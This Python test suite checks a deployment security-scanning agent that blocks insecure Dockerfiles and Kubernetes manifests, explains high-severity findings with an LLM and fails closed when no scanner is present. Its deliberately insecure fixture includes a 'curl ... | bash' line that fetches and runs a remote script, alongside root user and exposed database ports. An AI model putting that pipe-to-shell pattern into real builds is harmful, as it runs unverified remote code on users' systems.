from unittest.mock import AsyncMock, patch

import pytest

from deploymint.agents.warden import SecurityWardenAgent, clamp_llm_severity

# checkov's own process-startup overhead (interpreter boot + importing its
# full check registry) is ~2.5-3s *before it scans a single file* — real,
# unavoidable, and paid on every subprocess invocation regardless of scan
# size (verified directly: `checkov --version` alone costs ~2.8s). Most
# tests below aren't exercising checkov's own behavior — they're testing
# OPA findings, Trivy merging, or LLM-explanation logic — so mocking it out
# here saves that overhead ~8 times per suite run without weakening what
# those tests actually assert. `test_checkov_scans_terraform_and_github_actions_too`
# below is the one test that keeps the real subprocess call, since it's
# specifically verifying checkov's own --framework coverage.
NO_CHECKOV_FINDINGS = AsyncMock(return_value=([], None))

BAD = {
    "dockerfile": "FROM ubuntu:latest\nUSER root\nEXPOSE 22\n"
                  "RUN curl http://x.io/i.sh | bash\nCMD python app.py\n",
    "dockerignore": "",
    "k8s_deployment": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bad\n"
                      "spec:\n  selector:\n    matchLabels: {}\n  template:\n    metadata: {}\n"
                      "    spec:\n      containers:\n"
                      "      - name: bad\n        image: bad:latest\n",
    "k8s_service": "apiVersion: v1\nkind: Service\nmetadata:\n  name: bad\n"
                   "spec:\n  type: LoadBalancer\n  ports:\n  - port: 5432\n",
}


@pytest.mark.asyncio
async def test_bad_artifacts_are_blocked(tmp_path):
    with patch("deploymint.core.scanners.run_checkov", new=NO_CHECKOV_FINDINGS):
        out = await SecurityWardenAgent().run(
            {"run_id": "run_bad", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
        )
    sec = out["security"]
    assert sec["passed"] is False
    ids = {f["id"] for f in sec["findings"]}
    assert "DM_ROOT_USER_EXPLICIT" in ids
    assert "DM_SENSITIVE_PORT" in ids
    assert sec["blocked_reason"]


@pytest.mark.asyncio
async def test_counts_reflects_actual_findings(tmp_path):
    with patch("deploymint.core.scanners.run_checkov", new=NO_CHECKOV_FINDINGS):
        out = await SecurityWardenAgent().run(
            {"run_id": "run_counts", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
        )
    sec = out["security"]
    total = sum(sec["counts"].values())
    assert total == len(sec["findings"])
    for lvl in ("critical", "high", "medium", "low", "info"):
        assert lvl in sec["counts"]


@pytest.mark.asyncio
async def test_counts_present_even_when_failing_closed(tmp_path, monkeypatch):
    monkeypatch.setattr("shutil.which", lambda name: None)
    out = await SecurityWardenAgent().run(
        {"run_id": "run_counts_closed", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
    )
    sec = out["security"]
    assert sec["passed"] is False
    assert isinstance(sec["counts"], dict)
    assert sum(sec["counts"].values()) == len(sec["findings"])


@pytest.mark.asyncio
async def test_template_output_passes(tmp_path):
    from deploymint.agents import templates

    art = templates.render(
        {"language": "python", "framework": "fastapi", "python_version": "3.11",
         "entrypoint": "main.py", "exposed_port": 8000, "package_manager": "pip"},
        "good", "deploymint/good:t",
    )
    with patch("deploymint.core.scanners.run_checkov", new=NO_CHECKOV_FINDINGS):
        out = await SecurityWardenAgent().run(
            {"run_id": "run_good", "repo_path": str(tmp_path),
             "artifacts": art.model_dump() | {"generated_by": "template"},
             "errors": []}
        )
    assert out["security"]["passed"] is True


@pytest.mark.asyncio
async def test_checkov_scans_terraform_and_github_actions_too(tmp_path):
    """18.7: Checkov's --framework list was extended to cover the new IaC
    artifact types, not just Dockerfile/K8s. Real subprocess call, not mocked."""
    from deploymint.agents import templates

    analysis = {"language": "python", "framework": "fastapi", "python_version": "3.11",
               "entrypoint": "main.py", "exposed_port": 8000, "package_manager": "pip"}
    art = templates.render(analysis, "good", "deploymint/good:t")
    extra = templates.render_extra_artifacts(analysis, "good", "deploymint/good:t", "run_good2")
    out = await SecurityWardenAgent().run(
        {"run_id": "run_good2", "repo_path": str(tmp_path),
         "artifacts": art.model_dump() | extra | {"generated_by": "template"},
         "errors": []}
    )
    sec = out["security"]
    assert sec["checkov_ran"] is True
    sources_scanned = {f["file"] for f in sec["findings"]}
    # The generated Terraform/GHA templates have a couple of known, non-blocking
    # (medium) findings — proving checkov actually walked those files, not just
    # silently ignored them because they weren't in --framework.
    assert any(f.endswith(".tf") for f in sources_scanned) or any(
        "deploy.yml" in f for f in sources_scanned
    ), sec["findings"]


@pytest.mark.asyncio
async def test_critical_and_high_findings_get_llm_explanations(tmp_path):
    """17.3: explanations are generated for critical/high findings only, and
    never block the run even if the LLM call fails for one of them."""
    with patch("deploymint.core.llm.complete", return_value="This could let an attacker in."), \
         patch("deploymint.core.scanners.run_checkov", new=NO_CHECKOV_FINDINGS):
        out = await SecurityWardenAgent().run(
            {"run_id": "run_bad2", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
        )
    sec = out["security"]
    critical_or_high = [f for f in sec["findings"] if f["severity"] in ("critical", "high")]
    assert critical_or_high
    for f in critical_or_high:
        assert f["explanation"] == "This could let an attacker in."
    low_or_medium = [f for f in sec["findings"] if f["severity"] not in ("critical", "high")]
    for f in low_or_medium:
        assert "explanation" not in f


@pytest.mark.asyncio
async def test_explanation_failure_does_not_block_or_crash(tmp_path):
    from deploymint.core.llm import LLMError

    with patch("deploymint.core.llm.complete", side_effect=LLMError("down")), \
         patch("deploymint.core.scanners.run_checkov", new=NO_CHECKOV_FINDINGS):
        out = await SecurityWardenAgent().run(
            {"run_id": "run_bad3", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
        )
    assert out["security"]["passed"] is False
    assert out["security"]["blocked_reason"]


@pytest.mark.asyncio
async def test_fails_closed_when_no_scanner_available(tmp_path, monkeypatch):
    monkeypatch.setattr("shutil.which", lambda name: None)
    out = await SecurityWardenAgent().run(
        {"run_id": "run_none", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
    )
    sec = out["security"]
    assert sec["passed"] is False
    assert sec["checkov_ran"] is False
    assert sec["opa_ran"] is False
    assert "no security scanner" in sec["blocked_reason"].lower()


class TestClampLlmSeverity:
    """Shared by redteam.py and code_audit.py — any agent whose findings come
    from an LLM call, not a deterministic scanner. See docs/32-redteam-fixes.md."""

    def test_lowercase_critical_clamps_to_high(self):
        assert clamp_llm_severity("critical") == "high"

    def test_uppercase_critical_clamps_to_high(self):
        assert clamp_llm_severity("CRITICAL") == "high"

    def test_mixed_case_recognized_severity_passes_through_lowercased(self):
        assert clamp_llm_severity("Medium") == "medium"

    def test_unknown_value_becomes_low_not_dropped(self):
        assert clamp_llm_severity("YIKES") == "low"

    def test_none_becomes_low(self):
        assert clamp_llm_severity(None) == "low"

    def test_empty_string_becomes_low(self):
        assert clamp_llm_severity("") == "low"
